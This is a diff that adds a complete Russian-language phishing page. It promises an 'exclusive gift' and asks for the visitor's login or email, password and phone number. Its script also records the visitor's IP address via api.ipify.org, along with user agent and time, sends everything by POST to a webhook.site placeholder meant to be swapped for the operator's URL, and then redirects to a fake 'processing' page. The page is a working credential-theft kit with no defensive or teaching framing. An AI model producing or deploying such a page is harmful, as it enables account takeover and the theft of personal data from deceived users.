@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Получи подарок</title>
+    <style>
+        body { 
+            font-family: Arial; 
+            text-align: center; 
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            padding: 50px;
+            color: white;
+        }
+        .gift-box { 
+            background: rgba(255,255,255,0.1); 
+            padding: 30px; 
+            border-radius: 15px;
+            display: inline-block;
+        }
+        input, button { 
+            padding: 12px; 
+            margin: 8px; 
+            border: none; 
+            border-radius: 5px; 
+        }
+        button { 
+            background: #ff6b6b; 
+            color: white; 
+            cursor: pointer; 
+        }
+    </style>
+</head>
+<body>
+    <div class="gift-box">
+        <h2>🎁 Получи эксклюзивный подарок!</h2>
+        <p>Введи данные для получения:</p>
+        <input type="text" id="login" placeholder="Твой логин/email">
+        <input type="password" id="password" placeholder="Пароль">
+        <input type="text" id="phone" placeholder="Номер телефона">
+        <button onclick="collectData()">Получить подарок</button>
+    </div>
+
+    <script>
+        function collectData() {
+            const data = {
+                login: document.getElementById('login').value,
+                password: document.getElementById('password').value,
+                phone: document.getElementById('phone').value,
+                ip: '',
+                userAgent: navigator.userAgent,
+                time: new Date().toLocaleString()
+            };
+
+            // Получаем IP через внешний сервис
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(ipData => {
+                    data.ip = ipData.ip;
+                    sendData(data);
+                })
+                .catch(() => {
+                    data.ip = 'Не удалось получить';
+                    sendData(data);
+                });
+        }
+
+        function sendData(data) {
+            // Отправляем на webhook.site или свой сервер
+            fetch('https://webhook.site/YOUR_UNIQUE_URL', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+
+            // Перенаправляем на фейковую страницу "обработки"
+            window.location.href = 'loading.html';
+        }
+    </script>
+</body>
+</html>
